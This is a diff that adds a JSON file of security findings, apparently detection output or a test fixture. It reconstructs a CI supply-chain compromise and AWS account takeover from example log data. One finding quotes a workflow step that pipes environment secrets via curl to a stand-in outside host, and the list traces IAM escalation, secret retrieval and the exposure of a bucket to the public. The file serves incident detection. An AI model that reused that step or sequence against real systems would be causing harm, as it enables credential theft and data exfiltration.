@@ -1,0 +1,163 @@
+{
+  "findings": [
+    {
+      "kind": "long-lived key used off a runner",
+      "verdict": "IoC",
+      "stage": "credential access / cloud auth",
+      "ts": "2026-10-06T01:20:00Z",
+      "principal": "runner-deploy",
+      "action": "GetCallerIdentity",
+      "sourceIP": "203.0.113.77",
+      "why": "IAM user key AKIAEXAMPLE7RUNNER01 from 203.0.113.77 (hosting ASN), non-CI user-agent, no MFA"
+    },
+    {
+      "kind": "IAM privilege escalation",
+      "verdict": "IoC",
+      "stage": "privilege escalation",
+      "ts": "2026-10-06T01:22:00Z",
+      "principal": "runner-deploy",
+      "action": "CreateAccessKey",
+      "sourceIP": "203.0.113.77",
+      "why": "CreateAccessKey on user/runner-deploy"
+    },
+    {
+      "kind": "IAM privilege escalation",
+      "verdict": "IoC",
+      "stage": "privilege escalation",
+      "ts": "2026-10-06T01:23:00Z",
+      "principal": "runner-deploy",
+      "action": "AttachUserPolicy",
+      "sourceIP": "203.0.113.77",
+      "why": "AttachUserPolicy on user/runner-deploy"
+    },
+    {
+      "kind": "unusual object-storage access",
+      "verdict": "IoC",
+      "stage": "collection",
+      "ts": "2026-10-06T01:26:00Z",
+      "principal": "runner-deploy",
+      "action": "GetObject",
+      "sourceIP": "203.0.113.77",
+      "why": "GetObject arn:aws:s3:::example-prod-pii"
+    },
+    {
+      "kind": "unusual object-storage access",
+      "verdict": "IoC",
+      "stage": "collection",
+      "ts": "2026-10-06T01:26:20Z",
+      "principal": "runner-deploy",
+      "action": "GetObject",
+      "sourceIP": "203.0.113.77",
+      "why": "GetObject arn:aws:s3:::example-db-backups"
+    },
+    {
+      "kind": "secret retrieval",
+      "verdict": "IoC",
+      "stage": "credential access",
+      "ts": "2026-10-06T01:27:00Z",
+      "principal": "runner-deploy",
+      "action": "GetSecretValue",
+      "sourceIP": "203.0.113.77",
+      "why": "GetSecretValue prod/db/master"
+    },
+    {
+      "kind": "storage made public",
+      "verdict": "IoC",
+      "stage": "exfiltration / persistence",
+      "ts": "2026-10-06T01:29:00Z",
+      "principal": "runner-deploy",
+      "action": "PutBucketPolicy",
+      "sourceIP": "203.0.113.77",
+      "why": "PutBucketPolicy arn:aws:s3:::example-prod-pii \u2014 policy allows Principal:* GetObject"
+    },
+    {
+      "kind": "backdoor-user attempt (blocked)",
+      "verdict": "REVIEW",
+      "stage": "persistence",
+      "ts": "2026-10-06T01:30:00Z",
+      "principal": "runner-deploy",
+      "action": "CreateUser",
+      "sourceIP": "203.0.113.77",
+      "why": "CreateUser AccessDenied"
+    }
+  ],
+  "gh_findings": [
+    {
+      "kind": "CI workflow modified to leak env",
+      "verdict": "IoC",
+      "stage": "runner compromise",
+      "ts": "2026-10-06T01:05:00Z",
+      "actor": "ex.contractor",
+      "sourceIP": "203.0.113.77",
+      "why": "added step: env | curl -X POST cdn-sync.example.net"
+    },
+    {
+      "kind": "stale developer identity active",
+      "verdict": "IoC",
+      "stage": "initial access",
+      "ts": "2026-10-06T01:05:00Z",
+      "actor": "ex.contractor",
+      "sourceIP": "203.0.113.77",
+      "why": "terminated identity still referenced in automation"
+    },
+    {
+      "kind": "stale developer identity active",
+      "verdict": "IoC",
+      "stage": "initial access",
+      "ts": "2026-10-06T01:08:00Z",
+      "actor": "ex.contractor",
+      "sourceIP": "203.0.113.77",
+      "why": "terminated identity still referenced in automation"
+    },
+    {
+      "kind": "stale developer identity active",
+      "verdict": "IoC",
+      "stage": "initial access",
+      "ts": "2026-10-06T01:11:00Z",
+      "actor": "ex.contractor",
+      "sourceIP": "203.0.113.77",
+      "why": "terminated identity still referenced in automation"
+    },
+    {
+      "kind": "CI secret exposed to step",
+      "verdict": "IoC",
+      "stage": "credential access",
+      "ts": "2026-10-06T01:11:00Z",
+      "actor": "ex.contractor",
+      "sourceIP": "203.0.113.77",
+      "why": "AWS_* env exposed to step"
+    }
+  ],
+  "iocs": {
+    "principals": [
+      "runner-deploy"
+    ],
+    "access_keys": [
+      "AKIAEXAMPLE7RUNNER01"
+    ],
+    "source_ips": [
+      "203.0.113.77"
+    ],
+    "buckets": [
+      "arn:aws:s3:::example-db-backups",
+      "arn:aws:s3:::example-prod-pii"
+    ],
+    "new_keys": [
+      "new key AKIAEXAMPLEN3WKEY99 created"
+    ],
+    "public_buckets": [
+      "arn:aws:s3:::example-prod-pii"
+    ]
+  },
+  "kill_chain_stages": [
+    "collection",
+    "credential access",
+    "credential access / cloud auth",
+    "exfiltration / persistence",
+    "initial access",
+    "persistence",
+    "privilege escalation",
+    "runner compromise"
+  ],
+  "classification": "Supply-chain abuse + cloud takeover"
+}
